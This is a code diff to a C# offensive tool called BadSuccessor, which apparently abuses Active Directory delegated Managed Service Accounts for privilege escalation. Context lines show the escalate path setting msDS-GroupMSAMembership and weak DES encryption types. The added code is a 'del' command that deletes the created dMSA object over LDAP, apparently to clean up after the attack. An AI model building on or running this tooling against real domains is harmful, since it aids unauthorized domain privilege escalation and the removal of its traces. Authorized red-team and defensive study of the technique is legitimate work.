@@ -39,6 +39,10 @@ namespace BadSuccessor
                     DoEscalate(args);
                     break;
 
+                case "del":
+                    DoDelete(args);
+                    break;
+
                 default:
                     Console.Error.WriteLine("[x] Unknown command: " + args[0]);
                     ShowHelp();
@@ -81,6 +85,8 @@ namespace BadSuccessor
             Console.WriteLine("  -machine     Machine account for msDS-GroupMSAMembership. Include the $, e.g: braavos$");
             Console.WriteLine("  -user        User account for msDS-GroupMSAMembership (sAMAccountName without domain)");
             Console.WriteLine("  -dc-ip       (Optional) FQDN or IP of the DC to bind against for schema-aware writes");
+            Console.WriteLine();
+            Console.WriteLine("  BadSuccessor del CreatedDMSAUser OU_DN");
             Console.WriteLine();
             Console.WriteLine("Note: You must specify either -machine OR -user, but not both.");
             Console.WriteLine();
@@ -397,6 +403,43 @@ namespace BadSuccessor
             acct.Properties["msDS-SupportedEncryptionTypes"].Value = DES_CBC_CRC | DES_CBC_MD5 | AES128_CTS; // 0x1C
 
             acct.CommitChanges();
+        }
+
+        static void DoDelete(string[] args)
+        {
+            if (args.Length != 3)
+            {
+                Console.WriteLine("Usage: BadSuccessor del <dMSA Common Name> <Target OU DN>");
+                Console.WriteLine("Example: BadSuccessor del dMSAAccountName OU=ServiceAccounts,DC=example,DC=com");
+                return;
+            }
+
+            string dmsaUserCn = $"CN={args[1]}";
+            string targetOuDn = args[2];
+            string userLdapPath = $"LDAP://{dmsaUserCn},{targetOuDn}";
+
+            try
+            {
+                using (DirectoryEntry userEntry = new DirectoryEntry(userLdapPath))
+                {
+                    string schemaClassName = userEntry.SchemaClassName;
+
+                    using (DirectoryEntry parent = userEntry.Parent)
+                    {
+                        parent.Children.Remove(userEntry);
+                        parent.CommitChanges();
+                        Console.WriteLine("[+] dMSA user has been successfully deleted.");
+                    }
+                }
+            }
+            catch (System.Runtime.InteropServices.COMException comEx)
+            {
+                Console.WriteLine($"[-] COMException: {comEx.Message} (HRESULT: {comEx.ErrorCode:X})");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[-]  Error: {ex.Message}");
+            }
         }
     }
 }
